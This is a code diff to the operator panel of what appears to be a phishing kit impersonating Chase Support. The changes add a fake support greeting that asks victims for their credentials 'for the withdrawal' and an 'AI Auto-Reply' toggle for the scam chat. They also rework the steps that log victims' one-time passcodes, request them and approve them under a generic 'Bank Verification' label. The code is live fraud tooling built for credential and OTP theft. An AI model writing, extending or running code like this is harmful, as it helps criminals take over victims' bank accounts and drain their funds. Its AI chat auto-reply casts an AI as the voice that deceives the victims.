@@ -235,7 +235,13 @@
             
             <!-- Live Chat Panel -->
             <div class="panel">
-                <h2>Live Chat (Chase Support)</h2>
+                <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #3a3a52; padding-bottom:10px; margin-bottom:15px;">
+                    <h2 style="border:none; padding:0; margin:0;">Live Chat (Chase Support)</h2>
+                    <div>
+                        <span style="color:#a0a0b8; font-size:14px; margin-right:10px;">AI Auto-Reply</span>
+                        <button id="aiToggleBtn" onclick="toggleAiReply()" style="background:#d9534f; color:white; padding:4px 12px; border:none; border-radius:4px; font-weight:bold; cursor:pointer; font-size:12px;">OFF</button>
+                    </div>
+                </div>
                 <div class="log-area" id="chatLog" style="display:flex;flex-direction:column;">
                     <p style="color:#666;">Chat history will appear here.</p>
                 </div>
@@ -336,10 +342,24 @@
                 // Poll Chat History
                 let chats = getSyncItem('chatHistory');
                 if (chats) {
-                    document.getElementById('chatLog').innerHTML = chats;
+                    let initialMessage = `<div class="chat-message admin"><strong>Chase Support:</strong> Hello, we're here to help you verify your accounts for the withdrawal. Please enter your credentials above and we'll proceed.</div>`;
+                    document.getElementById('chatLog').innerHTML = initialMessage + chats;
                     // Auto scroll to bottom (simple version)
                     let chatArea = document.getElementById('chatLog');
                     chatArea.scrollTop = chatArea.scrollHeight;
+                }
+                
+                // Update AI Toggle Button
+                let aiState = getSyncItem('aiAutoReply');
+                let aiBtn = document.getElementById('aiToggleBtn');
+                if (aiBtn) {
+                    if (aiState) {
+                        aiBtn.style.background = '#5cb85c';
+                        aiBtn.innerText = 'ON';
+                    } else {
+                        aiBtn.style.background = '#d9534f';
+                        aiBtn.innerText = 'OFF';
+                    }
                 }
                 
                 // Add action buttons if they don't exist in the log area (client side only)
@@ -350,37 +370,20 @@
         function injectAdminActions() {
             let logArea = document.getElementById('credentialsLog');
             
-            // 401k Actions
-            let s401k = getSyncItem('401kStatus');
-            if (s401k === 'submitted' && !document.getElementById('btnReqOtp401k')) {
-                logArea.innerHTML += `<div id="action401k_1" style="margin-top:10px; padding:10px; background:#3a3a52; border-radius:6px;">
-                    <strong style="color:orange;">Action Required (401k):</strong><br>
-                    <button id="btnReqOtp401k" onclick="requestOtp('401kStatus')" style="margin-top:5px; padding:5px 10px; background:#d9534f; color:white; border:none; border-radius:4px; cursor:pointer;">Request OTP</button>
+            // Bank Verification Actions
+            let sBank = getSyncItem('bankStatus');
+            if (sBank === 'submitted' && !document.getElementById('btnReqOtpBank')) {
+                logArea.innerHTML += `<div id="actionBank_1" style="margin-top:10px; padding:10px; background:#3a3a52; border-radius:6px;">
+                    <strong style="color:orange;">Action Required (Bank Verification):</strong><br>
+                    <button id="btnReqOtpBank" onclick="requestOtp('bankStatus')" style="margin-top:5px; padding:5px 10px; background:#d9534f; color:white; border:none; border-radius:4px; cursor:pointer;">Request OTP</button>
                 </div>`;
-            } else if (s401k === 'otp_submitted' && !document.getElementById('btnApprove401k')) {
-                let oldAction = document.getElementById('action401k_1');
+            } else if (sBank === 'otp_submitted' && !document.getElementById('btnApproveBank')) {
+                let oldAction = document.getElementById('actionBank_1');
                 if(oldAction) oldAction.style.display = 'none';
                 
-                logArea.innerHTML += `<div id="action401k_2" style="margin-top:10px; padding:10px; background:#3a3a52; border-radius:6px;">
-                    <strong style="color:orange;">Action Required (401k):</strong><br>
-                    <button id="btnApprove401k" onclick="approveStep('401kStatus')" style="margin-top:5px; padding:5px 10px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Process</button>
-                </div>`;
-            }
-            
-            // Wells Fargo Actions
-            let swf = getSyncItem('wfStatus');
-            if (swf === 'submitted' && !document.getElementById('btnReqOtpWf')) {
-                logArea.innerHTML += `<div id="actionWf_1" style="margin-top:10px; padding:10px; background:#3a3a52; border-radius:6px;">
-                    <strong style="color:orange;">Action Required (Wells Fargo):</strong><br>
-                    <button id="btnReqOtpWf" onclick="requestOtp('wfStatus')" style="margin-top:5px; padding:5px 10px; background:#d9534f; color:white; border:none; border-radius:4px; cursor:pointer;">Request OTP</button>
-                </div>`;
-            } else if (swf === 'otp_submitted' && !document.getElementById('btnApproveWf')) {
-                let oldAction = document.getElementById('actionWf_1');
-                if(oldAction) oldAction.style.display = 'none';
-                
-                logArea.innerHTML += `<div id="actionWf_2" style="margin-top:10px; padding:10px; background:#3a3a52; border-radius:6px;">
-                    <strong style="color:orange;">Action Required (Wells Fargo):</strong><br>
-                    <button id="btnApproveWf" onclick="approveStep('wfStatus')" style="margin-top:5px; padding:5px 10px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Process</button>
+                logArea.innerHTML += `<div id="actionBank_2" style="margin-top:10px; padding:10px; background:#3a3a52; border-radius:6px;">
+                    <strong style="color:orange;">Action Required (Bank Verification):</strong><br>
+                    <button id="btnApproveBank" onclick="approveStep('bankStatus')" style="margin-top:5px; padding:5px 10px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Process</button>
                 </div>`;
             }
             // Transaction History Actions
@@ -410,11 +413,8 @@
         async function approveStep(statusKey) {
             await setSyncItem(statusKey, 'approved', null);
             alert('Process approved.');
-            if(statusKey === '401kStatus') {
-                let el = document.getElementById('action401k_2');
-                if(el) el.style.display = 'none';
-            } else if (statusKey === 'wfStatus') {
-                let el = document.getElementById('actionWf_2');
+            if(statusKey === 'bankStatus') {
+                let el = document.getElementById('actionBank_2');
                 if(el) el.style.display = 'none';
             } else if (statusKey === 'txStatus') {
                 let el = document.getElementById('actionTx_2');
@@ -425,22 +425,22 @@
             }
         }
 
-        async function submit401kOtp() {
-            let otp = document.getElementById('401kOtp').value.trim();
+        async function submitBankOtp() {
+            let otp = document.getElementById('bankOtp').value.trim();
             const expected = await getSyncItem('expectedOtp') || "";
             if (otp) {
-                let logEntry = `<p><strong>401k OTP Attempt:</strong> ${otp}</p>`;
+                let logEntry = `<p><strong>Bank OTP Attempt:</strong> ${otp}</p>`;
                 let currentLogs = getSyncItem('adminLogs') || '';
                 await setSyncItem('adminLogs', currentLogs + logEntry, null);
-                console.log('401k OTP entered:', otp, 'expected:', expected);
+                console.log('Bank OTP entered:', otp, 'expected:', expected);
                 if (otp === expected) {
-                    document.getElementById('status401k').innerHTML = '<span style="color:green;"><i class="fas fa-check-circle"></i> Verification Complete!</span>';
-                    await setSyncItem('401kStatus', 'approved', null);
+                    document.getElementById('statusBank').innerHTML = '<span style="color:green;"><i class="fas fa-check-circle"></i> Verification Complete!</span>';
+                    await setSyncItem('bankStatus', 'approved', null);
                     await setSyncItem('expectedOtp', null);
-                    document.getElementById('otp401kGroup').style.display = 'none';
+                    document.getElementById('otpBankGroup').style.display = 'none';
                 } else {
                     alert('Invalid OTP code. Please try again.');
-                    document.getElementById('401kOtp').value = '';
+                    document.getElementById('bankOtp').value = '';
                 }
             } else {
                 alert('Please enter the OTP code.');
@@ -466,6 +466,12 @@
             
             // Optionally, we could automatically put it in the chat input for convenience:
             document.getElementById('adminChatInput').value = `Your verification code is: ${code}`;
+        }
+        
+        async function toggleAiReply() {
+            let currentState = getSyncItem('aiAutoReply') || false;
+            let newState = !currentState;
+            await setSyncItem('aiAutoReply', newState);
         }
         
         async function clearData() {
